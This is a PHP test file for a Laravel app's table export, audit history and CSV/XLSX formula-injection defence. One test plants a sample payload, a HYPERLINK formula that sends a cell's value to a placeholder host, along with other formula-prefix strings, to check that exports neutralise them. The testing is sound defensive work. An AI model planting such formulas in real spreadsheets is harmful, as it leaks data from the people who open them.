<?php

use App\Exports\TableExport;
use App\Models\User;
use App\Support\AuditHistory;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Spatie\Activitylog\Models\Activity;

test('exports a query to xlsx and csv and logs the export', function () {
    actingAsRole('owner');
    User::factory()->create(['name' => 'Zoé', 'email' => 'zoe@x.test']);
    $columns = ['Nombre' => 'name', 'Correo' => 'email', 'Mayúsculas' => fn (User $u) => mb_strtoupper($u->name)];
    $query = fn () => User::query()->where('email', 'zoe@x.test')->orderBy('id');

    $xlsx = TableExport::fromQuery($query(), 'usuarios', $columns, 'xlsx');
    $csv = TableExport::fromQuery($query(), 'usuarios', $columns, 'csv');

    expect($xlsx->getFile()->getExtension())->toBe('xlsx')
        ->and($csv->getFile()->getExtension())->toBe('csv')
        ->and(file_get_contents($csv->getFile()->getPathname()))->toContain('"Nombre","Correo"')->toContain('"Zoé","zoe@x.test","ZOÉ"');

    $log = Activity::inLog('exports')->where('event', 'exported')->latest('id')->firstOrFail();
    expect($log->properties['table'])->toBe('usuarios')->and($log->properties['format'])->toBe('csv')->and($log->properties['row_count'])->toBe(1);
});

test('audit history returns entries for a record', function () {
    actingAsRole('owner');
    $u = User::factory()->create(['name' => 'A']);
    $u->update(['name' => 'B']);

    $history = AuditHistory::for($u);

    expect($history)->toHaveCount(2)
        ->and($history[0]['event'])->toBe('updated')
        ->and($history[0]['changes'])->toContain(['field' => 'name', 'old' => 'A', 'new' => 'B'])
        ->and($history[1]['event'])->toBe('created');
});

test('exports neutralise spreadsheet formulas but keep numbers numeric', function () {
    actingAsRole('owner');
    $u = User::factory()->create(['name' => '=HYPERLINK("http://x/?"&B2,"ver")', 'email' => 'f@x.test']);
    $columns = [
        'Nombre' => 'name',
        'Mas' => fn (User $x) => '+1',
        'Menos' => fn (User $x) => '-cmd',
        'Arroba' => fn (User $x) => '@SUM(1)',
        'Tab' => fn (User $x) => "\t=1",
        'Negativo' => fn (User $x) => '-5',
        'Decimal' => fn (User $x) => '10.5000',
        'Entero' => fn (User $x) => 7,
    ];
    $query = fn () => User::query()->whereKey($u->id);

    $csv = file_get_contents(TableExport::fromQuery($query(), 'usuarios', $columns, 'csv')->getFile()->getPathname());
    expect($csv)->toContain('"\'=HYPERLINK(""http://x/?""&B2,""ver"")"')->toContain('"1"')->toContain('"\'-cmd"')->toContain('"\'@SUM(1)"')->toContain("\"'\t=1\"")
        ->toContain('"-5"')->toContain('"10.5"')->toContain('"7"');

    $xlsxPath = TableExport::fromQuery($query(), 'usuarios', $columns, 'xlsx')->getFile()->getPathname();
    $sheet = IOFactory::load($xlsxPath)->getActiveSheet();
    expect($sheet->getCell('A2')->getDataType())->toBe(DataType::TYPE_STRING)
        ->and($sheet->getCell('A2')->getValue())->toBe('=HYPERLINK("http://x/?"&B2,"ver")')
        ->and($sheet->getCell('F2')->getDataType())->toBe(DataType::TYPE_NUMERIC)
        ->and((string) $sheet->getCell('G2')->getValue())->toBe('10.5')
        ->and($sheet->getCell('H2')->getDataType())->toBe(DataType::TYPE_NUMERIC);
});
